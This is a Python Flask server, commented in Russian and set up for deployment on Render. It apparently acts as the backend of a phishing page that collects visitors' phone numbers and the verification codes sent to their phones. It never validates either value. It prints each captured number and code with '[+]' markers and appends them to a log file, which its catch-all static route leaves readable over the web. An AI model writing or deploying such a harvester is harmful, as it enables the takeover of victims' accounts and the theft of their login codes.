from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import uuid
import os
from datetime import datetime

app = Flask(__name__, static_folder='.')
CORS(app)

# Временное хранилище для номеров (в памяти)
pending_requests = {}
LOG_FILE = "logs.txt" # Файл, куда будут сохраняться данные

def write_log(text):
    """Функция для записи в файл с текущим временем"""
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"[{time_now}] {text}\n")

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/<path:filename>')
def serve_static(filename):
    return send_from_directory('.', filename)

@app.route('/api/send_code', methods=['POST'])
def api_send_code():
    data = request.json
    phone_number = data.get('phone')
    
    # Пишем в консоль и в файл
    msg = f"Введен номер: {phone_number}"
    print(f"\n[+] {msg}")
    write_log(msg)
    
    request_id = str(uuid.uuid4())
    pending_requests[request_id] = phone_number
    
    return jsonify({"success": True, "request_id": request_id})

@app.route('/api/verify_code', methods=['POST'])
def api_verify_code():
    data = request.json
    request_id = data.get('request_id')
    user_code = data.get('code')
    
    # Пишем в консоль и в файл
    msg = f"Введен код: {user_code}"
    print(f"\n[+] {msg}")
    write_log(msg)
    
    if request_id in pending_requests:
        phone = pending_requests[request_id]
        final_msg = f"УСПЕХ! Номер {phone} 'авторизован' с кодом {user_code}."
        print(f"[+] {final_msg}")
        write_log(final_msg)
        
        del pending_requests[request_id]
        return jsonify({"success": True})
    else:
        error_msg = "Ошибка: Сессия не найдена."
        print(f"[-] {error_msg}")
        write_log(error_msg)
        return jsonify({"success": False, "error": "Сессия истекла"})

# ВАЖНО: УДАЛЕНА СТРОКА app.run(...)
# Render сам запустит приложение через gunicorn
